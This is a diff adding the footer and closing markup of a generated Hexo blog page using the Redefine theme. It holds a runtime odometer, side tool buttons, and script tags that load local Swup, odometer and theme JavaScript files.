+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.0</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
